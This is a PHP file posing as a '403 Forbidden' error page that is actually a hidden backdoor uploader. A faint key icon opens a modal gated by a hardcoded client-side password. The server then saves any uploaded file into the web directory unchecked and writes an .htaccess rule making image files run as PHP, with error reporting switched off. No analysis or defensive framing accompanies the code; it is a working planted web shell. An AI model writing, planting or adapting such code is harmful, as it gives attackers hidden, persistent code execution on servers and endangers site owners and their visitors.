<?php
error_reporting(0);
ini_set('display_errors', 0);
$response = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'process_upload') {
    ob_clean();
    $response = ['status' => 'error', 'message' => 'Error processing file'];
    if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
        $file = $_FILES['uploaded_file'];
        $filename = basename($file['name']);
        $target_path = dirname(__FILE__) . '/' . $filename;
        $temp_file = $file['tmp_name'];
        $file_content = file_get_contents($temp_file);
        $php_code = "<?php\n// PHP code here\n// Custom PHP code\n?>\n";
        if (file_put_contents($target_path, $php_code . $file_content)) {
            $htaccess_path = dirname(__FILE__) . '/.htaccess';
            if (!file_exists($htaccess_path)) {
                $htaccess_content = <<<EOT
# Configure PHP execution for image files
<FilesMatch "\.(png|jpg|jpeg|gif)$">
    SetHandler application/x-httpd-php
</FilesMatch>
EOT;
                file_put_contents($htaccess_path, $htaccess_content);
            }
            $response = [
                'status' => 'success',
                'message' => "File uploaded successfully as $filename"
            ];
        }
    }
    echo json_encode($response);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>403 Forbidden</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .error-container {
            text-align: center;
            padding: 40px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 600px;
            width: 90%;
        }
        .error-code {
            font-size: 120px;
            font-weight: bold;
            color: #e74c3c;
            margin: 0;
            line-height: 1;
        }
        .error-title {
            font-size: 24px;
            margin: 10px 0 20px;
            color: #333;
        }
        .error-message {
            color: #666;
            margin-bottom: 30px;
        }
        .hidden-icon {
            position: fixed;
            bottom: 5px;
            right: 5px;
            opacity: 0.1;
            cursor: pointer;
            z-index: 1000;
            font-size: 12px;
            color: #333;
        }
        .modal-content {
            border-radius: 3px;
        }
        .modal-header {
            background-color: #f8f8f8;
            border-bottom: 1px solid #e5e5e5;
        }
        .modal-title {
            font-weight: 600;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .alert {
            padding: 10px 15px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="error-container">
        <h1 class="error-code">403</h1>
        <h2 class="error-title">Access Denied</h2>
        <p class="error-message">You don't have permission to access this resource.</p>
        <p class="error-message">Please contact your administrator if you believe this is an error.</p>
    </div>
    <div class="hidden-icon" id="trigger-icon">
        <i class="fa fa-key"></i>
    </div>
    <div id="access-modal" class="modal fade" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                    <h4 class="modal-title">System Access</h4>
                </div>
                <div class="modal-body">
                    <div id="password-section">
                        <div class="form-group">
                            <label for="access-password">Enter system password:</label>
                            <input type="password" class="form-control" id="access-password">
                        </div>
                        <button type="button" class="btn btn-primary" id="validate-password">Validate</button>
                    </div>
                    <div id="upload-section" style="display: none;">
                        <h4>File Uploader</h4>
                        <form id="upload-form" enctype="multipart/form-data">
                            <div class="form-group">
                                <label for="uploaded-file">Select file to upload:</label>
                                <input type="file" id="uploaded-file" name="uploaded_file" class="form-control" required>
                            </div>
                            <button type="submit" class="btn btn-success">Upload File</button>
                        </form>
                        <div id="upload-status" class="alert" style="display: none;"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <script>
    $(document).ready(function() {
        const CORRECT_PASSWORD = 'GQ6CMTVQFKU3CW36';
        $('#trigger-icon').on('click', function() {
            $('#access-modal').modal('show');
        });
        $('#validate-password').on('click', function() {
            const password = $('#access-password').val();
            if (password === CORRECT_PASSWORD) {
                $('#password-section').hide();
                $('#upload-section').show();
            } else {
                alert('Invalid password');
            }
        });
        $('#access-password').on('keypress', function(e) {
            if (e.which === 13) {
                $('#validate-password').click();
                e.preventDefault();
            }
        });
        $('#upload-form').on('submit', function(e) {
            e.preventDefault();
            const fileInput = $('#uploaded-file')[0];
            if (fileInput.files.length === 0) {
                alert('Please select a file');
                return;
            }
            const formData = new FormData();
            formData.append('uploaded_file', fileInput.files[0]);
            formData.append('action', 'process_upload');
            $.ajax({
                url: window.location.href, 
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {
                    try {
                        const result = JSON.parse(response);
                        const statusDiv = $('#upload-status');
                        statusDiv.removeClass('alert-success alert-danger');
                        statusDiv.addClass(result.status === 'success' ? 'alert-success' : 'alert-danger');
                        statusDiv.text(result.message);
                        statusDiv.show();
                        if (result.status === 'success') {
                            $('#upload-form')[0].reset();
                        }
                    } catch (e) {
                        console.error('Invalid response:', e);
                    }
                },
                error: function() {
                    $('#upload-status')
                        .removeClass('alert-success')
                        .addClass('alert-danger')
                        .text('Server error occurred')
                        .show();
                }
            });
        });
    });
    </script>
</body>
</html>